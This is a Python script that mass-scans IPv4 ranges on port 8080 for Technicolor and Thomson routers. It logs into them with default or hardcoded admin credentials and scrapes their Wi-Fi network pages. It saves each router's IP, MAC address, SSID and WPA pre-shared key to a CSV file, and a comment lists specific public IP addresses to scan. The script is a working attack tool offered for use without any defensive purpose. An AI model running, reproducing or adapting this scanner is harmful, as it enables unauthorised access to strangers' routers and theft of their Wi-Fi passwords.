# -*- coding: utf-8 -*-
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup
import socket

tech = 0
tom = 0
header = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
#181.52.82.215 181.54.153.14 http://186.87.3.237:8080/wlanRadio.asp 180-50 http://181.50.1.32:8080/wlanPrimaryNetwork.asp<<<< escanear esto
router = open('db.csv','a+')
for i in range(181,255):
    
    a = str(i)
    for j in range(50,255):
        b = str(j)
       
        for p in range(1,255):
            c = str(p)
            for u in range(0,255):
                d = str(u)
                h = str(i)+'.'+str(j)+'.'+str(p)+'.'+str(u)
                
                try:
                    #print h
                    #print 'probando...........................'+h
                    r1 = requests.get('http://'+str(h)+':8080/', timeout=1, headers=header)
                    head = r1.headers
                    
                    b = 'WWW-Authenticate' in head
                    if b==True:
                        thom = 'Basic realm="Thomson"'
                        techni = 'Basic realm="Technicolor"'
                        
                        
                        r = requests.get('http://'+h+':8080/', timeout=1)
                        n = r.headers['WWW-Authenticate']
                        print str(r.headers)+'........................'+h
                        if n == techni: ##Technicolor
                            tech = tech+1
                            #print r.headers
                            r2 = requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'password'), timeout=None, headers=header)
                            guess = requests.get('http://'+h+':8080/wlanGuestNetwork.asp', auth=HTTPBasicAuth('admin', 'password'), timeout=None, headers=header)
                            guess_ok = str(guess.status_code)
                            #:8080/wlanGuestNetwork.asp
                            parser1 = r2.content
                            #name="ServiceSetIdentifier"
                            bs1 = BeautifulSoup(parser1, "html.parser")
                            print guess_ok
                           
                            for name in bs1.find_all("td", align="middle"):
                                t = name.text[16:]
                                ma = t[-19:]
                                mac = ma[1:-1]
                                ssid = t[0:-19]
                                
                                for pwd in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
                                    router.write(h+','+'Technicolor'+','+str(mac)+','+str(ssid)+','+str(pwd["value"])+','+'\n')
                                    print h+".....Technicolor..........."+str(mac)+'.......'+str(ssid)+"....."+pwd["value"]
                                    #print name.text
                                   
                            """        
                                    
                            for ssid in bs1.find_all("td",{"align":"middle", "valign":"top"}):
                                x = ssid.text[24:]
                                m = x[-19:]
                                ma = m[1:-1]
                                ide = x[0:-19]
                                for passw in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
        
                                    print ".....Technicolor..........."+str(ma)+'.......'+str(ide)+"....."+passw["value"]
                                            
                            """
                                    
                        elif n==thom: ##Thomson
                            tom = tom+1
                            r3 = requests.get('http://' + h + ':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=None, headers=header)
                            r4 = requests.get('http://' + h + ':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=None, headers=header)
                            parser = r4.content
                            bs1 = BeautifulSoup(parser, "html.parser")
                            
                            
                            for name in bs1.find_all("td", align="middle"):
                                t = name.text[16:]
                                ma = t[-19:]
                                mac = ma[1:-1]
                                ssid = t[0:-19]
                                for pws in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
                                    router.write(h+','+'Thomson'+','+str(mac)+','+str(ssid)+','+str(pws["value"])+','+'\n')
                                    print h+".....Thomson..............."+str(mac)+'.......'+str(ssid)+"....."+pws["value"]
                        
                                    
                except requests.exceptions.Timeout:
                    pass
                except KeyError:
                    pass
                except socket.timeout:
                    pass
                except requests.exceptions.ConnectionError:
                    pass
        
router.close()
print str(tech)+" technicolor"
print str(tom)+" tomson"
print str(tech+tom)+" En total"

    
